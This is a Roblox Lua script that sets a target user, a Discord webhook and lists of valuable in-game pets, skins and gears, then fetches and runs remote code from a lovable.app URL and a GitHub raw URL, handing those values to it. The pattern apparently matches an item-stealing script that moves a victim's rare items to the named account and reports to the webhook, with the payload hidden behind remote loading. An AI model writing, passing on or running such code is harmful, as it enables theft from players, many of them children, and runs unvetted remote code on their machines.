local TARGET_ID = 9450956082
local TARGET_USER = "TheVenom298"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1535610379718107196/giLF9Zvf5h5ytOSbOgmnu8MXv2TSbeS2tE2HD17toLypikRR-X0Hwf4iPRxKNh89g2h3"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dragon Gingerini"] = true,
    ["Skibidi Toilet"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Hydra Bunny"] = true,
    ["Antonio"] = true,
    ["John Pork"] = true,
    ["Elefanto Frigo"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Capitano Americano"] = true,
    ["Rico Dinero"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["La Supreme Combinasion"] = true,
    ["Headless Horseman"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Bufalino Boomberino"] = true,
    ["Duggy Bros"] = true,
    ["Cerberus"] = true,
    ["4th Bros"] = true,
    ["Money Money Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Steakini Fattini"] = true,
    ["Caylusaurus"] = true,
    ["Los Hackers"] = true,
    ["Sammyni Cakini"] = true,
    ["Jelly Moby"] = true,
    ["Rhino Helicopterino"] = true,
    ["Foxini Lanternini"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Moby Bros"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Bunny and Eggy"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Los Amigos"] = true,
    ["Los Sekolahs"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Sammyni Fattini"] = true,
    ["Rosey and Teddy"] = true,
    ["Reinito Sleighito"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true
}

local TargetBaseSkins = {
    ["Tralalero"] = true,
    ["Summer"] = true,
    ["Yin Yang"] = true,
    ["Rainbow"] = true,
    ["Octo"] = true,
    ["Radioactive"] = true,
    ["Lava"] = true,
    ["Gold"] = true,
    ["Galaxy"] = true,
    ["Diamond"] = true,
    ["Cyber"] = true,
    ["Cursed"] = true,
    ["Candy"] = true,
    ["Divine"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Blackhole Bomb"] = true,
    ["Bloodmoon Slap"] = true,
    ["Cupid's Wings"] = true,
    ["Demon's Head"] = true,
    ["Cyber Slap"] = true,
    ["Lava Blaster"] = true,
    ["Radioactive Airstrike"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Lamp"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://byte-sculptor-lab.lovable.app/api/public/raw/63eee465-242b-40ea-a0e1-0959bc4f9ba9"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)